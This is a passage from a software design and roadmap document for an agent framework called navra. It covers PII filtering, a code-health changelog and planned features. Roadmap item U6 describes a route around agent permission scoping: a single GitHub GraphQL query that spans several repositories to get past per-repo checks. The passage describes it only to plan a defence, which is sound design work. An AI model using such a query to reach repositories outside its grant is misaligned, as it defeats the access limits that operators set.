| NER semantic detection | ProtectAI + multilingual XLM-RoBERTa ONNX models for entity recognition beyond regex patterns |
| Pseudonymization | `FilterAction::Pseudonymize` with `PseudonymMap` for reversible replacement (e.g., `Jean Dupont` → `Person_A`) |
| Custom PII patterns | `[[pii_patterns]]` config section for operator-defined PII categories |
| PII in embeddings | Cascade deletion from vector store when source content is purged |
| Model reasoning filter | PII detection on agent text output (model reasoning), not just tool results |
| File path PII detection | `PathPiiFilter` detects PII leaked via file paths (e.g., `/home/jean.dupont/`) |
| Consent tracking | Per-data-subject consent records; `pii_report` tool for GDPR data subject access requests |
| PII model download | `navra pii download` CLI command to fetch NER models (protectai, xlm-roberta) |

### Detection layers

1. **Regex** — US patterns (SSN, credit card, phone, email) + EU
   patterns (NIR, IBAN, SIRET, EU phone, IP, passport) + custom
   `[[pii_patterns]]`
2. **NER** — ProtectAI (English) + XLM-RoBERTa (multilingual) ONNX
   models for semantic entity recognition
3. **File paths** — `PathPiiFilter` detects usernames, personal
   directories, and name patterns in file paths

### Filter actions

| Action | Behavior |
|--------|----------|
| `pass` | Log finding, no modification |
| `redact` | Replace with `[REDACTED:category]` |
| `pseudonymize` | Replace with consistent pseudonym via `PseudonymMap` |
| `block` | Reject the entire response |

### Storage filtering

PII filters run on all persistence paths: memory ingestion,
audit/blackbox logs, distillation output, and vector embeddings
(cascade deletion on purge).

### GDPR tools

| Tool | Purpose |
|------|---------|
| `memory_purge_pii` | Purge all PII for a data subject |
| `memory_forget` | Delete specific memory entries |
| `pii_report` | Generate data subject access report |
| `pii_consent` | Record/query consent status |

---

## Code health (updated 2026-05-03)

### Completed ✅

| Item | When |
|------|------|
| `rust-toolchain.toml` + `rustfmt.toml` + `justfile` | 2026-04-20 |
| Clippy auto-fix (103 → 53 → 0 warnings) | 2026-04-20, 2026-04-24 |
| Mutex poison recovery (all `.lock().unwrap()`) | 2026-04-17 |
| main.rs decomposition (cli, demo, ui, *_tools modules) | 2026-04-17, 2026-04-24 |
| 50+ security findings across 6 audit rounds | 2026-04-17–20 |
| Extract auth middleware in `ui.rs` | 2026-04-25 |
| GitHub Actions CI | 2026-04-25 |
| Make hardcoded values configurable | 2026-04-25 |
| Per-teammate operation scoping (delegated capability tokens) | 2026-04-25 |
| Split large files (server.rs, tools.rs, streamable.rs, config.rs, a2a.rs) | 2026-04-24 |
| Per-crate README.md files | 2026-04-24 |
| Module-level //! doc comments (all crates) | 2026-04-24 |
| Rename docs_* → file_*, MCP resources for reads | 2026-04-25 |
| Full PII pipeline (regex + NER + paths, pseudonymization, GDPR tools) | 2026-04-25 |
| Containerized agent execution (shared model server + per-agent sandboxes) | 2026-05-03 |
| navra-agent standalone binary + Dockerfile.agent | 2026-05-03 |
| Two self-review rounds: 20+ findings fixed (security, perf, code quality) | 2026-05-05 |
| Phase 8a: Typed agent action/result model (AgentAction, RiskLevel) | 2026-05-05 |
| Phase 8b: MCP config import (Claude Desktop, VSCode, Codex) | 2026-05-05 |
| Phase 9a-9h: MCP spec coverage 14→35/39 (types, pagination, notifications, OAuth, stdio, proc macros) | 2026-05-05 |
| Notification bus: notify()/notify_session() on McpServer | 2026-05-05 |
| OAuth 2.0 endpoints wired into Axum router | 2026-05-05 |
| navra-macros crate: `#[tool]` proc macro (18th crate) | 2026-05-05 |
| Domain-agnostic review + improve flows with dynamic persona selection | 2026-05-07 |
| build_test MCP tool, task-level tool/operation grants in flow YAML | 2026-05-07 |
| Git branch creation, `navra improve` CLI | 2026-05-07 |
| Planner JSON resilience (markdown stripping, id-boundary recovery) | 2026-05-07 |
| Schema enforcement on generates_tasks agents (in-process + container) | 2026-05-07 |
| response_format plumbed through ChatRequest → Ollama API | 2026-05-07 |
| Container agent stdout parsing fix (skip log lines before JSON) | 2026-05-07 |
| Comparative flow evaluation: hardcoded vs dynamic persona selection | 2026-05-07 |
| MCP spec complete: completion/complete, logging/setLevel, resources/subscribe+unsubscribe | 2026-05-15 |
| WebSocket transport (`/ws` endpoint alongside SSE) | 2026-05-15 |
| GitHub forge module (navra-tools-github, 21st crate, 6 tools via `gh` CLI) | 2026-05-15 |
| Statistical guardrails (cosine drift + Shannon entropy, post-hook) | 2026-05-15 |
| Context budget enforcement (BudgetHook, head+tail truncation) | 2026-05-15 |
| All tools migrated to `#[tool]` proc macro | 2026-05-15 |
| Git remote operations (git_push, git_pull, git_fetch) | 2026-05-15 |
| Phase 7e: Hybrid FTS5+vector search in ChunkStore (RRF fusion, k=60) | 2026-05-26 |
| Phase 9m: Upstream tool scanning (8 categories, wired into discover()) | 2026-05-26 |
| Phase 9n: Cognitive file integrity monitoring (SHA-256 + semantic drift) | 2026-05-26 |
| Phase 12c: Prometheus /metrics + OTel trace export (feature-gated) | 2026-05-26 |
| Phase 14a: Agent signal (Interrupt/Terminate/Pause/Resume) | 2026-05-26 |
| Phase 14b: Kernel state as MCP resources (navra:// URIs) | 2026-05-26 |
| Phase 14c: Resource list filtering by agent permissions | 2026-05-26 |
| Phase 14d: Agent process hibernation (conversation + KV cache) | 2026-05-26 |
| Phase 14e: Preemptive scheduling (cancel on ModelBackend, token quotas) | 2026-05-26 |
| Phase 7f: Breadcrumb injection in chunking (heading hierarchy for embeddings) | 2026-05-26 |
| Phase 7g: Confidence gating (GatedReranker with mean-score abstention) | 2026-05-26 |
| Phase 2f: Anti-propagation hop limits (max_hops + rate limiting) | 2026-05-26 |
| Phase 2g: Provenance headers (chain on messages + blackboard entries) | 2026-05-26 |
| Phase 7h: Batch cross-encoder scoring (single ONNX call, 10x speedup) | 2026-05-26 |
| Phase 6f: MCP tunnel compatibility (Anthropic + OpenAI documentation) | 2026-05-26 |
| Phase 1h: Deterministic replay (recipe store, matching, substitution) | 2026-05-26 |
| Phase 2d: Durable DAG execution (per-node checkpoint, idempotency cache) | 2026-05-26 |
| Phase 12a: Flow audit completeness (started_at UPSERT fix, 7/8 already done) | 2026-05-26 |
| Phase 2e: Event log (append-only, sequence-numbered, divergence detection) | 2026-05-26 |
| Phase 9p: HASP SkillHook (Block/ModifyArg/InjectContext/Noop interventions) | 2026-05-26 |
| Phase 12f: RAMPART safety test suite (129 variants, 5 attack categories) | 2026-05-26 |

### Remaining

| Item | Phase | Effort | Priority |
|------|-------|--------|----------|
| **model-runtime dimension refactor** (HardwareTarget, ModelFormat, ExecutionMode) | 11n | 1-2 days | **High** |
| **TensorRtRuntime backend** | 11a | 2-3 days | Medium-High |
| ~~TurboQuant KV cache~~ (--cache-type-k/v flags) | ✅ | — | — |
| Session store sharding (DashMap) | 12b | 1-2 days | Medium |
| Streaming model download (pull → disk) | 12b | 2-3 days | Medium |
| Feature-gate ONNX | 12b | Invasive | Low |
| Upstream TLS (DESIGN.md gap) | 9 or 12b | 2-3 days | Medium |
| ~~Convert tools to `#[tool]` proc macro~~ | ✅ 2026-05-15 | — | — |
| DeepSec CI integration | Evaluate | — | Low |
| ~~Statistical guardrails~~ (cosine z-score drift + Shannon entropy) | ✅ 2026-05-15 | — | — |
| ~~WebSocket transport~~ (alongside SSE for agentic loops) | ✅ 2026-05-15 | — | — |
| ~~GLiGuard safety model evaluation~~ (ONNX, multi-label) | ✅ | — | — |
| ~~OTel GenAI observability~~ (traces + Prometheus /metrics) | ✅ | — | — |
| ~~`obo` identity claim + RFC 8693 token exchange~~ | ✅ | — | — |
| ~~RoutingHook~~ (cost-aware model routing via ONNX classifier) | ✅ | — | — |
| ~~Durable DAG execution~~ (per-node checkpoint, idempotency cache) | ✅ 2026-05-26 | — | — |
| ~~Memory scoping~~ (entity/process/session, temporal validity) | ✅ | — | — |
| ~~Trace-based memory extraction~~ (MemoryExtractionHook) | ✅ | — | — |
| ~~Progressive tool disclosure~~ (session-scoped tool sets) | ✅ | — | — |
| **Speculative decoding** (EAGLE3/FastDraft in model-runtime) | 11g | 2-3 days | Medium |
| ~~navra-flow DAG test framework~~ (PTA/dominator validation) | ✅ | — | — |
| ~~Event-driven triggers~~ (webhook, cron, file watch) | ✅ | — | — |
| ~~fd-passing TOCTOU mitigation~~ (navra-tools-file) | ✅ | — | — |
| ~~Upstream tool scanning~~ (poisoning, typosquatting, schema abuse) | ✅ 2026-05-26 | — | — |
| ~~Cognitive file integrity~~ (SHA-256 + semantic drift detection) | ✅ 2026-05-26 | — | — |
| ~~Hybrid FTS5+vector in ChunkStore~~ (RAG consensus) | ✅ 2026-05-26 | — | — |
| ~~OTel observability~~ (Prometheus + OTel trace export) | ✅ 2026-05-26 | — | — |
| ~~Breadcrumb injection~~ (zero-cost retrieval improvement) | ✅ 2026-05-26 | — | — |
| ~~Anti-propagation hop limits~~ (network red-teaming defense) | ✅ 2026-05-26 | — | — |
| ~~Provenance headers~~ (anti-amplification defense) | ✅ 2026-05-26 | — | — |
| ~~Event log durable execution~~ (append-only, sequence-numbered) | ✅ 2026-05-26 | — | — |
| ~~Deterministic replay~~ (recipe compilation + replay) | ✅ 2026-05-26 | — | — |
| ~~Confidence gating~~ (RAG abstention) | ✅ 2026-05-26 | — | — |
| ~~MCP tunnel compatibility~~ (documentation + validation) | ✅ 2026-05-26 | — | — |
| ~~Gateway field filtering~~ (token optimization) | ✅ | — | — |
| ~~HASP Program Functions~~ (SkillHook in hook pipeline) | ✅ 2026-05-26 | — | — |
| ~~Batch cross-encoder scoring~~ | ✅ 2026-05-26 | — | — |
| ~~Early commitment fast paths~~  | ✅ | — | — |
| ~~Section-level pointer retrieval~~  | ✅ | — | — |
| ~~RAMPART-style safety test suite~~ (129 variants, 5 categories) | ✅ 2026-05-26 | — | — |
| ~~SDB formalization~~  | ✅ | — | — |
| ~~Self-verification gate~~  | ✅ | — | — |
| ~~Loop detection middleware~~  | ✅ | — | — |
| ~~Reasoning sandwich~~  | ✅ | — | — |
| ~~Per-agent temperature~~  | ✅ | — | — |
| ~~Response sanitization audit~~  | ✅ | — | — |
| ~~Trust decay scoring~~ | ✅ | — | — |
| ~~Risk-tiered approval~~ | ✅ | — | — |
| ~~Trajectory evaluation metrics~~ | ✅ | — | — |
| ~~Metadata pre-filtering~~ | ✅ | — | — |
| **Skill source pipeline** | 1j | 2-3 days | Medium |
| **NemoClaw alternative design** | 6g | 1 day | Medium |
| **Privacy Router coordination** | 6h | 1 day | Medium |
| **delta-mem OSAM evaluation** | 11i | 2 days | Medium |
| ~~Trajectory branching~~ | ✅ | — | — |
| **KG triple storage** | 3k | 2-3 days | Low-Medium |
| **Operator libraries** | 2l | 0.5-1 day | Low |
| **HTML-to-markdown conversion** | 9t | 1 day | Low-Medium |
| **Harness-aligned training** | 11j | Research | Medium |
| ~~Un-ignore NER tests~~ | ✅ 2026-05-13 | — | — |
| ~~Un-ignore OpenShell tests~~ | ✅ 2026-05-13 | — | — |
| ~~Un-ignore IFC LLM test~~ | ✅ 2026-05-13 | — | — |
| ~~Delete redundant bench timing tests~~ | ✅ 2026-05-13 | — | — |

---

## Gap analysis: Python prototype → Rust

The original Python prototype (294 files, 64K LoC) has capabilities
that the Rust crate family does not yet replicate. This section maps
each gap to a planned crate or enhancement.

### What Rust already does better

- **Security**: Python has none. Rust has full auth, IFC, capability
  tokens, trusted paths, safety filters, hooks.
- **Protocol**: Python wraps HTTP. Rust has stdio/HTTP/SSE + resilient
  reconnection, A2A Agent Cards, AID discovery, mDNS.
- **Model management**: Python is manual. Rust pulls from registries
  and serves with container isolation.
- **Gateway**: Python is client-only. Rust has a full MCP gateway
  aggregating upstream servers with unified security.

### What's missing

| Python prototype capability | Rust equivalent | Gap |
|--------------------------|----------------|-----|
| Cognitive core (40 personas, 36 heuristics, 8 directives) | 43 personas, 36 heuristics, 7 directives + Forge + Weaver | **Done** |
| Weaver (persona + context → structured prompt) | Weaver with budget-aware context, per-phase limits | **Done** |
| Task decomposition (recursive planning, scope partitioning) | DAG executor + flow_escalate + dynamic planner tasks + generates_tasks | **Done** (scope partitioning via planner decomposition) |
| DAG execution (parallel tasks with dependencies) | DagExecutor with DependencyGraph | **Done** |
| Mesh communication (lateral agent messaging) | Mailbox + Blackboard (IFC-gated) | **Done** |
| Persistent memory (working, long-term, cases) | SQLite sessions + working memory + FTS5 + distillation + RRF retrieval + decay + MCP tools | **Done** |
| Anti-drift (mandate validation, drift detection) | Mandate validator + success_criteria | **Done** |
| Failure recovery (circular fix detection, attempt history) | Attempt history, circular fix detector, recovery strategies | **Done** |
| Observability (structured metrics, monitoring) | tracing + audit.db (flow_results, flow_metadata) + blackbox. Per-agent tool/model call tables exist but are not populated (Phase 12a) | **Partial** |
| TUI (rich terminal interface) | CLI + web UI at localhost:9315. Rich TUI is a non-goal (Goose provides frontend) | **Non-goal** |

---

## Roadmap

### URGENT: Platform tool modules (git remote + forge integration)

**Goal**: Add remote Git operations (push/pull/fetch) to
`navra-tools-git` and create per-provider forge modules
(`navra-tools-github`, `navra-tools-gitlab`, `navra-tools-jira`)
exposing platform-specific tools with scoped permissions.

**Context**: Inspired by [service-gator](https://github.com/LobsterTrap/service-gator)
(Rust MCP server for scoped forge access). navra already has
local git tools but no remote operations or forge API integration.
The tool naming convention (`<provider>_<resource>_<action>`) is
documented in DESIGN.md.

#### U1. Git remote operations ✅ (2026-05-15)

`git_push`, `git_pull`, `git_fetch` added to `navra-tools-git`.
Push requires approval. Input validation for remote/branch names.

#### U2. GitHub module (`navra-tools-github`)

New crate. Tools: `github_pr_create`, `github_pr_list`,
`github_pr_review`, `github_issue_create`, `github_issue_list`,
`github_issue_comment`. Uses `gh` CLI or GitHub REST API.
MCP resources: `github://org/repo/pulls`, `github://org/repo/issues`.

**Effort**: 3-4 days **Priority**: High
**Acceptance**: Create a PR from an agent with scoped permissions,
glob-based ACLs on tool names (`github_pr_*`).

#### U3. GitLab module (`navra-tools-gitlab`)

New crate. Tools: `gitlab_mr_create`, `gitlab_mr_list`,
`gitlab_mr_approve`, `gitlab_issue_list`, `gitlab_issue_comment`.
Uses `glab` CLI or GitLab REST API.

**Effort**: 3-4 days **Priority**: Medium-High
**Acceptance**: Create an MR from an agent with fork-only push support.

#### U4. Jira module (`navra-tools-jira`)

New crate. Tools: `jira_issue_create`, `jira_issue_list`,
`jira_issue_get`, `jira_issue_transition`, `jira_issue_comment`.
Uses Jira REST API.

**Effort**: 2-3 days **Priority**: Medium
**Acceptance**: Create and transition an issue from an agent.

#### U5. Permission patterns for platform tools

Validate that deny-wins ACL globs work cleanly with three-part
tool names. Document permission recipes: read-only GitHub access,
push-to-fork-only, PR-create-without-merge, etc.

**Effort**: 1 day **Priority**: High **Depends on**: U2
**Acceptance**: Config examples in DESIGN.md, integration tests.

#### U6. GraphQL scope escape prevention

GitHub's GraphQL API allows a single query to span multiple
repositories, bypassing per-repo permission checks. The GitHub
module must either restrict to REST API only, or parse the GraphQL
AST (via `graphql-parser`) to extract repository arguments and
validate each against allowed repos before forwarding.

**Effort**: 1-2 days **Priority**: High **Depends on**: U2
**Acceptance**: GraphQL query spanning two repos where only one is
allowed is rejected. Unit tests for query extraction.

#### U7. Policy engine sidecar (optional)

Add optional external policy engine integration for conditional
policies (time-based access, multi-approval gates, environment
restrictions). Policy engine runs as a sidecar, queried via
localhost HTTP. Can only further restrict access — never grant
beyond what TOML ACLs allow.

**Cedar first** (preferred):
- Formal verification of policy properties (addresses FIDES gap)
- Explicit deny semantics match our deny-wins ACL model
- 42-60x faster than Rego in benchmarks
- Rust SDK (`cedar-policy` crate) — native integration, no sidecar
  needed. Embed Cedar engine in-process for zero-latency evaluation.
- Deterministic, safe (no loops, no side effects)
- Emerging as the MCP access control standard (Natoma, AWS REX)

**OPA/Rego as fallback** (enterprise compatibility):
- CNCF graduated, massive enterprise adoption
- Enterprises bring existing Rego policy bundles
- Runs as sidecar, queried via localhost HTTP
- Rego learning curve is steep (Datalog-like)

**Other evaluated**: OpenFGA (Zanzibar-style, overkill for current
ACLs), Polar/Oso (app-authz, SaaS pricing), CEL (no deny
semantics), Sentinel (IaC only).

**Effort**: 3-4 days **Priority**: Medium **Depends on**: U5
**Acceptance**: Cedar policy denying a tool call that TOML ACLs
would allow. Feature-gated, zero overhead when disabled. OPA
sidecar as alternative backend behind same interface.

#### U8. Kubernetes-friendly config reload

Watch config parent directory (not file) via inotify for atomic
symlink replacement (Kubernetes ConfigMap pattern). 50ms debounce
for temp-file-then-rename. Graceful degradation: invalid config
keeps the previous valid state, logs the error.

**Effort**: 1-2 days **Priority**: Medium-High
**Acceptance**: ConfigMap-mounted scope file update takes effect
within 1s without restart. Invalid TOML keeps old config.

---

### Phase 1: Cognitive core (navra-cognitive)

**Goal**: Load persona/directive/heuristic YAML files, compile them
into structured system prompts, and integrate with navra-agent.

New crate: `navra-cognitive` (**Status**: Complete.
Forge + Weaver, specializations, output schema, per-phase model,
token budgeting, context compaction, per-phase context limits,
43 personas (38 from Python + 5 general-purpose), agent `.persona()` builder.)

#### 1a. Context management and token budgeting ✅

Add to the Weaver:

- **Token budget allocator**: Slot-based system with priority order:
  system prompt (fixed) > conversation history (reserved) > retrieved
  docs (remaining). Prevents silent overflow and coherence collapse.
- **Context compaction**: Auto-summarize old conversation turns when
  approaching token limit (triggered at configurable threshold,
  default 80%). Summarize tool outputs older than N calls.
- **Per-phase context limits**: Add `planning_context_limit` and
  `execution_context_limit` fields to Persona YAML schema, alongside
  existing `planning_model` / `execution_model`.
- **Extractive compression**: Query-aware sentence selection within
  budget, returned in document order (not relevance order).

Reference: Goose auto-compaction model, tech watch article on
context layers (2026-04-17).

#### 1b. Persona porting and agent integration ✅

- `Agent::builder().persona(forge, name)` — done
- 43 personas (38 from Python + 5 general-purpose), 36 heuristics,
  7 directives — done

#### 1c. Persona evolution via momentum-based adaptation ✅

Add dynamic persona adaptation inspired by PersonaVLM's Personality
Evolving Mechanism (PEM). Personas accumulate interaction-derived
traits over time rather than staying static YAML:

- **Trait vector**: Each persona maintains a vector of behavioral
  scores (e.g., verbosity, formality, risk tolerance) alongside
  its YAML definition.
- **Momentum update**: After each session, extract observed behavioral
  signals and update the trait vector with exponential moving average:
  `trait_new = α * observed + (1 - α) * trait_old` (α configurable,
  default 0.1 for slow adaptation).
- **Prompt injection**: Weaver reads the trait vector and adjusts
  prompt emphasis (e.g., a persona that evolves toward conciseness
  gets stronger brevity instructions).
- **Reset/freeze**: Users can freeze a persona's evolution or reset
  to YAML defaults. Trait history stored in SQLite for auditability.
- **Scope**: Per-user persona evolution (same persona can evolve
  differently for different users).

This is NOT personality simulation — it's adaptive calibration of
agent behavior based on accumulated feedback signals.

Reference: PersonaVLM (arXiv 2604.13074), Personality Evolving
Mechanism with Big Five momentum-based updates.

#### 1d. Lazy-loading persona specializations (NEW)

Inactive persona specializations are represented as name +
description only. Full specialization content (prompts, heuristics,
output schemas) is loaded into context only when the Weaver
activates that specialization:

- **Catalog**: On startup, index all specialization YAML files
  but store only metadata (name, description, trigger conditions).
- **On-demand loading**: When the Weaver selects a specialization
  for prompt assembly, load the full YAML content.
- **Context savings**: Reduces baseline context overhead for personas
  with many specializations (some personas have 5+ specializations).

Reference: SemaClaw skill lazy-loading (arXiv 2604.11548).

#### 1g. Negative constraints in persona schema (NEW)

Add `negative_constraints` as a first-class field in persona YAML.
Currently directives only specify positive behavior ("do X"). Negative
constraints ("do NOT do Y") are proven to narrow the output space and
reduce noise without sacrificing essential information:

- New field: `negative_constraints: [str]` in persona YAML
- Weaver injects as "Do NOT" instructions after the mandate
- Examples: "Do NOT use marketing language", "Do NOT pad responses
  with caveats", "Do NOT explain what the code does"
- Separate from heuristics (which are conditional guidance) — these
  are absolute prohibitions

**Effort**: 0.5 day. **Priority**: Low.
**Acceptance**: Weaver emits negative constraints in system prompt.

Reference: Systematic prompting guide (2026-05-03) — negative
constraints as prompt-layer technique for precision.

#### 1h. Deterministic replay for repetitive tasks ✅ (2026-05-26)

**Crate**: `navra-agent` (tool_loop.rs, new `replay.rs`)

When a tool loop completes successfully, export the trace as a
replayable recipe. Future runs with the same task pattern bypass
the LLM entirely, re-executing the same tool sequence with variable
substitution.

- **Trace compilation**: After successful completion, compile the
  `ActionRecord` sequence into a branch-free recipe (ordered list
  of tool calls with argument templates). Store as JSON alongside
  Hermes traces.
- **Pattern matching**: On new task, check if any compiled recipe
  matches (task description similarity > configurable threshold).
  If match found, offer replay mode.
- **Variable substitution**: Template variables in tool arguments
  (file paths, branch names) are substituted from the new task
  context. If substitution fails, fall back to LLM reasoning.
- **Validation**: After replay, run a verification step (compare
  output structure to original). If verification fails, discard
  replay and fall back to LLM.
- **Token savings**: LOOP framework reports 93-99% token reduction
  for repetitive tasks. navra already exports Hermes traces —
  this extends them with replay capability.

**Effort**: 2-3 days. **Priority**: High.
**Acceptance**: Same file review task runs 10x with <5% of original
token consumption. Replay produces equivalent output.

Reference: LOOP framework (TDS, 2026-05-21), Hermes trace export.

#### 1i. Early commitment / task classification fast paths ✅ (2026-05-26)

**Crate**: `navra-cognitive` (weaver.rs, new `fast_path.rs`)

Add a lightweight classification step before full LLM reasoning.
The persona's heuristics YAML defines "fast paths" — recognized
task patterns that constrain tool selection and skip open-ended
exploration.

- **Task classifier**: Small ONNX model (MiniLM or existing safety
  classifier) classifies the incoming prompt into task categories
  defined in heuristics YAML. ~10ms overhead.
- **Fast path definition**: New `fast_paths` section in heuristic
  YAML specifying: trigger condition (category match), constrained
  tool set, max iterations, temperature override.
- **Constrained tool injection**: When a fast path matches, the
  Weaver injects "restrict to these tools: [...]" into the system
  prompt and reduces max_iterations.
- **Fallback**: If the fast path fails (tool call error, unexpected
  output), automatically fall back to full reasoning.

A telehealth agent example: classify "routine refill" → restrict
to pharmacy DB tools, skip diagnostic reasoning. Prevents open-ended
exploration on well-understood tasks.

**Effort**: 1-2 days. **Priority**: Medium-High.
**Acceptance**: Recognized task patterns complete in 50% fewer
iterations and tokens than unrestricted reasoning.

Reference: Token burn problem (TDS, 2026-05-21).

#### 1j. Composable skill source pipeline (NEW — tech watch 2026-05-25) ✅ (2026-05-29)

**Crate**: `navra-cognitive` (new `skill_pipeline.rs`)

Replace flat YAML directory scanning with a composable pipeline
for skill discovery, inspired by Microsoft Agent Framework's
five-source architecture:

- **FileSkillsSource**: Current behavior — scan YAML dirs for
  personas, directives, heuristics.
- **RegistrySkillsSource**: Pull skills from OCI registries or
  HuggingFace (reuses navra-model-hub pull infrastructure).
- **CrossCompatSkillsSource**: Scan `.claude/skills`,
  `.cursor/skills`, `.agents/skills` directories for cross-tool
  skill definitions (CodeWhale/Cursor/Claude Code format).
- **AggregatingSource**: Merge multiple sources into unified catalog.
- **DeduplicatingSource**: First-occurrence-wins deduplication by
  skill name/id.
- **FilteringSource**: Predicate-based ACL filtering (permission
  checks before skill becomes available to agent).

Each source implements a `SkillSource` trait with
`fn discover(&self) -> Vec<SkillMetadata>` and
`fn load(&self, id: &str) -> Skill`.

**Effort**: 2-3 days. **Priority**: Medium.
**Acceptance**: Skills loaded from local YAML + cross-tool dirs +
registry, deduplicated, filtered by ACLs.

Reference: Microsoft Agent Framework skill composition (2026-05-22),
CodeWhale cross-compatible discovery (2026-05-25).

#### 1k. MUSE-Autoskill lifecycle management (NEW — tech watch 2026-05-28) ✅ (2026-05-29)

**Crate**: `navra-cognitive` (new `skill.rs`)

Add formal skill lifecycle management based on MUSE-Autoskill
(ByteDance/RIT, 2605.27366). navra-cognitive has `Persona` with
`skills: Vec<String>` but no creation, testing, memory, or refinement
pipeline:

- **SKILL.md format**: Adopt Anthropic Agent Skills format as skill
  standard. Natural extension of existing YAML persona/directive
  structure. Each skill gets: SKILL.md (definition), .memory.md
  (per-skill experience), scripts/ (executable), tests/ (validation),
  resources/ (data).
- **Skill-level memory**: .memory.md files accumulating per-skill
  experience. New memory tier alongside TraitVector persona traits.
- **Test-before-register**: Skills require passing unit tests before
  registration. Prevents bad skill accumulation (MUSE found this
  critical for reliability).
- **IFC labels on skills**: Taint-track skills to prevent skill
  injection attacks. A skill loaded from an untrusted source gets
  Untrusted integrity label. Skill execution inherits the label.
- **Model-aware routing**: Skills extracted by one model may cause
  negative transfer in another (From Raw Experience to Skill
  Consumption, 2605.23899). Tag skills with the model that created
  them and route accordingly.

**Effort**: 5-7 days. **Priority**: Medium.
**Depends on**: 1j (skill source pipeline).
**Acceptance**: Skills created, tested, registered, and refined
through lifecycle. Per-skill memory accumulates across sessions.
Skill injection blocked by IFC.

Reference: MUSE-Autoskill (2605.27366), From Raw Experience to Skill
Consumption (2605.23899), Anthropic Agent Skills format.

**Why first**: The cognitive core is navra's identity. Without it,
agents are generic. Every other feature builds on top of personas.

#### 1e. Context budget → tool output compression ✅ (2026-05-26)

**Crate**: `navra-cognitive` (budget.rs) + `navra-core` (CallContext)

`ContextBudget` exists but tools ignore it. Wire budget awareness
into `CallContext` so modules self-compress based on remaining tokens:

- Add `remaining_tokens: Option<usize>` to `CallContext`
- `CallToolResult::compress(max_tokens)` method that truncates
  tool output to fit (RTK pattern: 60-90% token reduction)
- Intent-based compression: `file_read` returns summary if budget
  is tight, full content if budget is ample (Strands pattern)
- Weaver applies budget after tool output injection

**Effort**: 2-3 days. **Priority**: High.
**Acceptance**: Self-review flow completes with 40% fewer tokens.

#### 1f. Bidirectional persona bridge ✅ (2026-05-26)

**Crate**: `navra-cognitive` (new `bridge.rs`)

Import and export personas across agent frameworks:

- **Import**: Anthropic-style agent plugin dirs → cognitive YAML
  (`agents/*.md` → Persona, `skills/*.md` → Directive,
  `scripts/*.py` → upstream tool definitions)
- **Export**: persona + heuristics + directives → single markdown
  for Claude Code, Cursor, or other systems
- CLI: `navra persona import <dir>`, `navra persona export <name>`

**Effort**: 2-3 days. **Priority**: High.
**Acceptance**: Round-trip import/export preserves persona semantics.

### Phase 2: DAG execution & mesh communication (navra-flow v2) ✓

**Status**: Core done. Enhancements planned.

Implemented in `navra-flow`:

- Task struct: id, specialist, mandate, depends_on, inputs,
  expected_output, success_criteria, back_edges
- DependencyGraph: topological sort (Kahn's algorithm), cycle
  detection, transitive dependent tracking
- DagExecutor: dependency-ordered execution, parallel readiness
  detection (true parallelism blocked by Agent `&mut self` — future work)
- Iterative executor: scout→map→reduce with convergence detection
- Agent mailbox: IFC-gated lateral messaging (Bell-LaPadula
  no-write-down), per-agent mpsc channels, audit log
- Shared blackboard: flow-level key-value store with per-entry
  IFC labels, taint-on-read (lattice join)
- Conditional back-edges: post-completion routing with bounded
  iterations (ScoreBelow, CriteriaMissing, OutputContains, Always)
- Virtual mesh tools: mesh_post, mesh_recv, bb_publish, bb_read,
  bb_keys injected into agent tool lists
- 112 tests including cross-primitive IFC integration tests

**Remaining**: Scope partitioning (predict file conflicts, serialize
conflicting tasks) and true parallel execution across specialists
(`Arc<Mutex<Agent>>` refactor).

#### 2a. YAML flow definitions and shareable format (design complete)

Switch flow definitions from TOML-only to YAML-primary (keep TOML
support via file extension detection — same serde structs):

- Add fields to flow/DAG definitions: `parameters` (Jinja-style
  template variables), `output_json_schema`, `retry` policy,
  `required_extensions` (MCP servers needed to run the flow).
- `navra flow import-goose <recipe.yaml>` CLI command to convert
  Goose recipes into navra flow definitions (with human review).
- YAML is consistent with cognitive core (personas/heuristics).

#### 2b. Dynamic subflow spawning from tool loop ✅

Add a `spawn_subflow` virtual tool to the agent tool loop. An agent
inside a tool-use loop can create a single-node DAG on the fly and
execute it as a subflow (uses existing DagExecutor, no new engine).
This gives ad-hoc delegation without requiring static flow files.

- Max depth: 1 (subflows cannot spawn sub-subflows)
- Max concurrent: 10 (configurable)
- Timeout: 5 minutes default
- Isolated context (no shared conversation history)

#### 2c. Flow-template-driven orchestration ✅

Replace ad-hoc team orchestration (leader manually calling
team_create/team_add/team_message) with template-driven flows
exposed via MCP:

- **Flow templates as YAML**: Parameterized flow definitions for
  common patterns (security audit, code review, research, analysis).
  Each template defines stages (triage → deep review → synthesis),
  model selection hints per stage, and file grouping strategies.
- **Planner as flow selector**: Instead of designing work
  decomposition from scratch, the planner calls `flow_list` to
  discover available templates, picks one, and parameterizes it
  (target directory, depth, focus areas).
- **Leader executes flows**: `flow_start` with parameters replaces
  the manual 12-step team workflow. The flow engine handles
  teammate spawning, dependency ordering, and result collection.
- **Task-specific decomposition**: Audit flows use triage-first
  (fast agent reads all files, flags interesting ones, then
  specialists do deep review). Research flows use parallel
  investigation. Analysis flows use sequential refinement.
- **Model hints per stage**: Templates specify model requirements
  per stage (speed_tier=fast for triage, reasoning=extended for
  synthesis). The flow engine resolves to actual models via
  model cards at runtime.

This bridges the existing `navra-flow` DAG engine with the
team orchestration tools. The pieces exist (YAML loader with
`{{ param }}` substitution, `ParameterDef`, `single_task_dag()`,
flow MCP tools) — they need to be composed.

**Why**: Ad-hoc team orchestration wastes leader iterations on
boilerplate (create team, add 5 specialists, message each, poll).
Flow templates encode orchestration expertise once and reuse it.
The planner's domain knowledge goes into choosing the right
template and parameters, not reinventing the workflow each time.

#### 2d. Durable DAG execution with crash recovery ✅ (2026-05-26)

**Crate**: `navra-flow` (executor, new `checkpoint.rs`)

Add SQLite-backed checkpointing to the DAG executor for crash
recovery, inspired by Google ADK's pause/resume and DBOS:

- **Checkpoint after each node**: Persist DAG node completion
  state and tool-call results to SQLite after each node completes.
  On crash recovery, skip completed nodes and resume from last
  checkpoint.
- **Structured workflow state**: Separate workflow state (DAG
  progress, pending signals, entity data) from conversation
  history. Inject structured state into prompts on resume rather
  than replaying conversation turns (ADK pattern — avoids context
  pollution and token cost explosion).
- **Idempotency tracking**: Track tool-call UUIDs and cache results
  for non-idempotent operations (file writes, git commits, command
  execution). If an agent crashes after calling a tool but before
  checkpointing, the replay skips the tool call and uses the
  cached result.
- **Atomic state transitions**: Use SQLite transactions to ensure
  checkpoint consistency. `state_delta` pattern: hydrate session,
  apply delta, persist atomically.

DBOS validates this pattern: SQLite-backed, in-process library,
